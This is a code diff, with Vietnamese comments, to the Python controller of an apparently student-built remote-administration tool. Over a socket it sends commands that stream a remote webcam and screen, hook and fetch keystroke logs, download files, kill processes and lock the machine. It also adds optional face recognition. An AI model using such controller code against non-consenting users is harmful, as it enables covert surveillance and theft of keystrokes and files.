@@ -16,9 +16,17 @@ import struct
 import sqlite3
 import re
 import cv2
-import face_recognition
 import numpy as np
 import math 
+
+
+try:
+    import face_recognition
+    AI_AVAILABLE = True
+except ImportError:
+    AI_AVAILABLE = False
+    print("-> [SYSTEM] Không tìm thấy thư viện 'face_recognition'. Đã TẮT tính năng AI.")
+    
 
 def clean_keylog_text(raw_text):
     if not raw_text: return ""
@@ -155,9 +163,8 @@ class PythonBridge:
         self.lock = threading.Lock()
         self.running_stream = False
 
-    # --- HÀM SOCKET CƠ BẢN ---
+    # --- HÀM SOCKET CƠ BẢN (Giống C++ receiveLine) ---
     def _recv_line(self):
-        # Đọc từng byte cho đến khi gặp \n (Giả lập behavior của C++)
         line = b''
         while True:
             try:
@@ -178,16 +185,16 @@ class PythonBridge:
             except: break
         return data
 
-    def InitWinsock(self): pass 
+    def InitWinsock(self): pass # Mac không cần init winsock
 
     def ConnectToServer(self, ip, port):
         try:
             if self.sock: self.sock.close()
             real_ip = ip.decode() if isinstance(ip, bytes) else ip
             self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.sock.settimeout(10) 
+            self.sock.settimeout(5) # Timeout kết nối 5s
             self.sock.connect((real_ip, int(port)))
-            self.sock.settimeout(None)
+            self.sock.settimeout(None) # Sau khi kết nối thì bỏ timeout (hoặc set dài hơn)
             print(f"[MAC-BRIDGE] Connected to {real_ip}:{port}")
             return True
         except Exception as e:
@@ -201,26 +208,35 @@ class PythonBridge:
             self.sock.sendall(data + b'\n')
         except: pass
 
-    # --- CÁC HÀM TÍNH NĂNG (ĐƯỢC VIẾT LẠI TỪ C++ SANG PYTHON) ---
+    # --- CÁC TÍNH NĂNG (MÔ PHỎNG LẠI Y HỆT C++) ---
 
-    def GetSystemStats(self):
-        # Gửi lệnh MONITOR -> Nhận 1 dòng dữ liệu
+    def GetRemoteActiveWindow(self):
+        # Tính năng Giám sát Hoạt động
         try:
-            self.SendStringCmd("MONITOR")
-            self.sock.settimeout(3)
+            self.SendStringCmd("GET_ACTIVE_APP")
+            self.sock.settimeout(2)
             data = self._recv_line()
             self.sock.settimeout(None)
-            return data.encode('utf-8') # Trả về bytes để khớp với logic cũ
+            if not data: return b"Unknown|Empty"
+            return data.encode('utf-8')
+        except: return b"Unknown|Error"
+
+    def GetSystemStats(self):
+        try:
+            self.SendStringCmd("MONITOR")
+            self.sock.settimeout(2)
+            data = self._recv_line()
+            self.sock.settimeout(None)
+            return data.encode('utf-8')
         except: return b"0|0|0|0|0"
 
     def GetAppList(self):
-        # Logic: Gửi APPLICATION -> XEM -> Nhận số lượng -> Nhận từng dòng
         try:
             self.SendStringCmd("APPLICATION")
             time.sleep(0.1)
             self.SendStringCmd("XEM")
             
-            self.sock.settimeout(10)
+            self.sock.settimeout(5)
             count_str = self._recv_line()
             count = int(count_str) if count_str.isdigit() else 0
             
@@ -232,20 +248,17 @@ class PythonBridge:
                     pid = self._recv_line()
                     threads = self._recv_line()
                     mem = self._recv_line()
-                    # Format lại thành chuỗi ghép: pid|name|threads|mem
                     result += f"{pid}|{name}|{threads}|{mem}\n"
             
             self.SendStringCmd("QUIT")
             self.sock.settimeout(None)
             return result.encode('utf-8')
-        except Exception as e: 
-            print("GetAppList Error:", e)
-            return b""
+        except: return b""
 
     def GetInstalledApps(self):
         try:
             self.SendStringCmd("GET_INSTALLED")
-            self.sock.settimeout(10)
+            self.sock.settimeout(5)
             count_str = self._recv_line()
             count = int(count_str) if count_str.isdigit() else 0
             
@@ -260,43 +273,36 @@ class PythonBridge:
 
     def GetDrives(self):
         try:
-            self.SendStringCmd("EXPLORER")
-            time.sleep(0.1)
+            self.SendStringCmd("EXPLORER"); time.sleep(0.1)
             self.SendStringCmd("GET_DRIVES")
             
             count_str = self._recv_line()
             count = int(count_str) if count_str.isdigit() else 0
-            
             result = ""
             for _ in range(count):
                 result += self._recv_line() + "\n"
-                
             self.SendStringCmd("QUIT")
             return result.encode('utf-8')
         except: return b""
 
     def ExplorePath(self, path_bytes):
         try:
-            self.SendStringCmd("EXPLORER")
-            time.sleep(0.1)
+            self.SendStringCmd("EXPLORER"); time.sleep(0.1)
             self.SendStringCmd("GET_DIR")
-            self.SendStringCmd(path_bytes) # Gửi đường dẫn
+            self.SendStringCmd(path_bytes)
             
             count_str = self._recv_line()
             count = int(count_str) if count_str.isdigit() else 0
-            
             result = ""
             for _ in range(count):
                 result += self._recv_line() + "\n"
-                
             self.SendStringCmd("QUIT")
             return result.encode('utf-8')
         except: return b""
 
     def DownloadFile(self, remote_path_bytes, local_save_path_bytes):
         try:
-            self.SendStringCmd("EXPLORER")
-            time.sleep(0.1)
+            self.SendStringCmd("EXPLORER"); time.sleep(0.1)
             self.SendStringCmd("DOWNLOAD")
             self.SendStringCmd(remote_path_bytes)
 
@@ -305,9 +311,10 @@ class PythonBridge:
 
             if size > 0:
                 local_path = local_save_path_bytes.decode('utf-8')
+                # Đọc binary
                 with open(local_path, "wb") as f:
                     remaining = size
-                    self.sock.settimeout(30) # Tải file lớn thì chờ lâu
+                    self.sock.settimeout(20) 
                     while remaining > 0:
                         chunk_size = 4096 if remaining > 4096 else remaining
                         chunk = self._recv_exact(chunk_size)
@@ -319,48 +326,84 @@ class PythonBridge:
             self.SendStringCmd("QUIT")
         except Exception as e: print("Download Error:", e)
 
-    # --- STREAM (GIỮ NGUYÊN NHƯ CŨ VÌ ĐÃ CHẠY TỐT) ---
-    def _receive_stream(self, filename, cmd_start):
+    # --- STREAM (Webcam & Screen) ---
+    def _receive_stream(self, filename, cmd_mode):
         if not self.sock: return
-        self.SendStringCmd("VIDEO" if "VIDEO" in cmd_start else "WEBCAM")
+        # Nếu cmd_mode là "VIDEO" -> Server hiểu là Screen
+        # Nếu cmd_mode là "WEBCAM" -> Server hiểu là Webcam
+        self.SendStringCmd(cmd_mode)
         time.sleep(0.2)
         self.SendStringCmd("START")
         
         self.running_stream = True
-        self.sock.settimeout(3)
+        self.sock.settimeout(3) # Timeout ngắn để check loop
         
+        # Buffer lớn cho Screen
+        MAX_BUFFER = 5 * 1024 * 1024 
+
         while self.running_stream:
             try:
                 header = self._recv_line()
                 if header in ["STOPPED", "QUIT", "", "TIMEOUT"]: break
+                
                 try: size = int(header)
                 except: continue
-                if size > 10000000: continue 
+                
+                if size <= 0 or size > MAX_BUFFER: continue 
                 
                 img_data = self._recv_exact(size)
-                if not img_data: break
+                if not img_data or len(img_data) != size: continue
                 
-                tmp_name = filename + ".tmp"
+                # Kỹ thuật Atomic Write: Ghi file tạm -> Rename
+                tmp_name = filename + ".tmp_py"
                 with open(tmp_name, "wb") as f: f.write(img_data)
-                if os.path.exists(filename): os.remove(filename)
+                
+                if os.path.exists(filename): 
+                    try: os.remove(filename)
+                    except: pass
+                    
                 os.rename(tmp_name, filename)
-                time.sleep(0.02)
-            except: break
+                
+                time.sleep(0.015) # ~60fps max
+            except Exception: 
+                # Lỗi timeout hoặc socket
+                pass
         
         self.SendStringCmd("QUIT")
         self.sock.settimeout(None)
 
-    def ReceiveWebcamStream(self): self._receive_stream(WEBCAM_JPG, "WEBCAM")
-    def ReceiveScreenStream(self): self._receive_stream(SCREEN_JPG, "VIDEO")
+    def ReceiveWebcamStream(self): 
+        self._receive_stream(WEBCAM_JPG, "WEBCAM")
+        
+    def ReceiveScreenStream(self): 
+        self._receive_stream(SCREEN_JPG, "VIDEO")
 
-    # --- CÁC HÀM KHÁC (STUB HOẶC SIMPLE CMD) ---
+    def CaptureScreen(self):
+        try:
+            self.SendStringCmd("TAKEPIC"); time.sleep(0.2)
+            self.SendStringCmd("TAKE")
+            size_str = self._recv_line()
+            size = int(size_str) if size_str.isdigit() else 0
+            if size > 0:
+                with open(SCREENSHOT_BMP, "wb") as f:
+                    remaining = size
+                    self.sock.settimeout(10)
+                    while remaining > 0:
+                        chunk = self._recv_exact(min(4096, remaining))
+                        if not chunk: break
+                        f.write(chunk)
+                        remaining -= len(chunk)
+                self.sock.settimeout(None)
+            self.SendStringCmd("QUIT")
+        except: pass
+
+    # --- Process Control ---
     def KillProcess(self, pid_bytes): 
-        # PROCESS -> KILL -> KILLID -> PID -> QUIT -> QUIT
         self.SendStringCmd("PROCESS"); time.sleep(0.05)
         self.SendStringCmd("KILL");    time.sleep(0.05)
         self.SendStringCmd("KILLID");  time.sleep(0.05)
         self.SendStringCmd(pid_bytes)
-        self._recv_line() # Đọc phản hồi
+        self._recv_line() # Dọn buffer phản hồi
         self.SendStringCmd("QUIT"); self.SendStringCmd("QUIT")
 
     def StartProcess(self, name_bytes):
@@ -375,8 +418,7 @@ class PythonBridge:
     def RestartServer(self): self.SendStringCmd("RESTART")
     def LockServer(self): self.SendStringCmd("LOCK")
     
-    # Keylog & Noti: Tạm thời gửi lệnh để Server ghi file, 
-    # Logic đọc file của Python sẽ tự xử lý qua API /api/keylog/text
+    # --- Keylog ---
     def HookKeylog(self): 
         self.SendStringCmd("KEYLOG"); time.sleep(0.1); 
         self.SendStringCmd("HOOK");   time.sleep(0.1); 
@@ -389,60 +431,32 @@ class PythonBridge:
         self.SendStringCmd("KEYLOG"); time.sleep(0.1); 
         self.SendStringCmd("CLEAR");  self._recv_line(); 
         self.SendStringCmd("QUIT")
+
     def GetKeylog(self): 
-        # Python Native: Gửi lệnh PRINT -> Nhận chuỗi -> Ghi đè file keylog.txt
-        # Để đơn giản: Ta dùng cơ chế API cũ đọc file, nhưng ở đây có thể implement nhận trực tiếp
-        # Nếu server.cs hỗ trợ trả về chuỗi qua socket thay vì file path
-        # (Dựa trên server.cs hiện tại, nó gửi PRINT -> socket.Write(content))
+        # Cần phải đọc hết nội dung server gửi
         try:
             self.SendStringCmd("KEYLOG"); time.sleep(0.1)
             self.SendStringCmd("PRINT")
-            # Cần đọc buffer lớn
+            
+            # Đọc theo chunk, vì keylog có thể dài
             self.sock.settimeout(2)
-            # Đọc đến khi hết (giả sử server gửi 1 cục)
-            data = self.sock.recv(65536) 
+            data = b""
+            while True:
+                try:
+                    chunk = self.sock.recv(4096)
+                    if not chunk: break
+                    data += chunk
+                    # Nếu server gửi xong thường sẽ không đóng socket ngay,
+                    # nhưng lệnh PRINT bên server gửi 1 lần là flush.
+                    # Hack: nếu nhận ít hơn buffer size thì coi như hết.
+                    if len(chunk) < 4096: break 
+                except: break
+            
+            # Ghi đè vào file keylog.txt
             with open(KEYLOG_TXT, "wb") as f: f.write(data)
+            
             self.SendStringCmd("QUIT")
             self.sock.settimeout(None)
-        except: pass
-
-    def GetNotificationHistory(self):
-        # NOTI là file binary DB
-        # Logic này hơi phức tạp vì server gửi size -> gửi bytes
-        try:
-            self.SendStringCmd("GET_NOTI")
-            size_str = self._recv_line()
-            size = int(size_str) if size_str.isdigit() else 0
-            if size > 0:
-                with open(HISTORY_DB, "wb") as f:
-                    remaining = size
-                    self.sock.settimeout(5)
-                    while remaining > 0:
-                        chunk = self._recv_exact(min(4096, remaining))
-                        if not chunk: break
-                        f.write(chunk)
-                        remaining -= len(chunk)
-                self.sock.settimeout(None)
-        except: pass
-        
-    def CaptureScreen(self):
-        # TAKEPIC -> TAKE -> Nhận size -> Nhận ảnh
-        try:
-            self.SendStringCmd("TAKEPIC"); time.sleep(0.2)
-            self.SendStringCmd("TAKE")
-            size_str = self._recv_line()
-            size = int(size_str) if size_str.isdigit() else 0
-            if size > 0:
-                with open(SCREENSHOT_BMP, "wb") as f:
-                    remaining = size
-                    self.sock.settimeout(5)
-                    while remaining > 0:
-                        chunk = self._recv_exact(min(4096, remaining))
-                        if not chunk: break
-                        f.write(chunk)
-                        remaining -= len(chunk)
-                self.sock.settimeout(None)
-            self.SendStringCmd("QUIT")
         except: pass
 # ---------------------------------------------------------
 
@@ -824,28 +838,30 @@ if not os.path.exists(FACE_LOG_DIR):
     
 
 # Load ảnh Admin khi khởi động
-ADMIN_IMG_PATH = os.path.join(FACE_LOG_DIR, "admin_fixed.jpg")
-if os.path.exists(ADMIN_IMG_PATH):
-    try:
-        # 1. Đọc bằng OpenCV (C cực nhanh)
-        img_cv = cv2.imread(ADMIN_IMG_PATH)
-        
-        if img_cv is not None:
-            # 2. Chuyển BGR -> RGB (AI cần RGB)
-            # Numpy < 2.0 tự động xử lý bộ nhớ, không cần ép kiểu thủ công nữa
-            image_rgb = cv2.cvtColor(img_cv, cv2.COLOR_BGR2RGB)
+ADMIN_ENCODING = None
+if AI_AVAILABLE: # Chỉ chạy nếu có thư viện AI
+    ADMIN_IMG_PATH = os.path.join(FACE_LOG_DIR, "admin_fixed.jpg")
+    if os.path.exists(ADMIN_IMG_PATH):
+        try:
+            # 1. Đọc bằng OpenCV (C cực nhanh)
+            img_cv = cv2.imread(ADMIN_IMG_PATH)
             
-            # 3. Đưa vào AI (Lấy encoding đầu tiên)
-            encodings = face_recognition.face_encodings(image_rgb)
-            if len(encodings) > 0:
-                ADMIN_ENCODING = encodings[0]
-                print(f"-> [AI] ✅ Đã nạp dữ liệu khuôn mặt Admin.")
-            else:
-                print(f"-> [AI] ⚠️ Không tìm thấy khuôn mặt trong ảnh.")
-    except Exception as e:
-        print(f"-> [AI] Lỗi: {e}")
-else:
-    print(f"-> [AI] Không thấy file ảnh Admin.")
+            if img_cv is not None:
+                # 2. Chuyển BGR -> RGB (AI cần RGB)
+                # Numpy < 2.0 tự động xử lý bộ nhớ, không cần ép kiểu thủ công nữa
+                image_rgb = cv2.cvtColor(img_cv, cv2.COLOR_BGR2RGB)
+                
+                # 3. Đưa vào AI (Lấy encoding đầu tiên)
+                encodings = face_recognition.face_encodings(image_rgb)
+                if len(encodings) > 0:
+                    ADMIN_ENCODING = encodings[0]
+                    print(f"-> [AI] ✅ Đã nạp dữ liệu khuôn mặt Admin.")
+                else:
+                    print(f"-> [AI] ⚠️ Không tìm thấy khuôn mặt trong ảnh.")
+        except Exception as e:
+            print(f"-> [AI] Lỗi: {e}")
+    else:
+        print(f"-> [AI] Không thấy file ảnh Admin.")
 
 
 
@@ -885,6 +901,9 @@ def read_safe_image(path, retries=3):
 
 # --- 2. HÀM XỬ LÝ AI TRÊN ẢNH ---
 def process_ai_frame(frame_bgr):
+    if not AI_AVAILABLE:
+        return frame_bgr
+    
     global stranger_detect_start, no_face_detect_start, last_stranger_save_time, SUPERVISE_MODE
 
     now = time.time()
